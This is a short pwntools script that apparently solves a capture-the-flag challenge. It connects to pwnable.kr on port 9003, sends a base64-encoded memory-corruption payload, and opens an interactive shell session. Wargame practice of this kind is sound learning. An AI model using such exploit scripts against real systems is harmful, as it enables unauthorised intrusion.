from pwn import *

p=remote("pwnable.kr",9003)
p.sendline("QUFBQXiSBAhA6xEI")
p.interactive()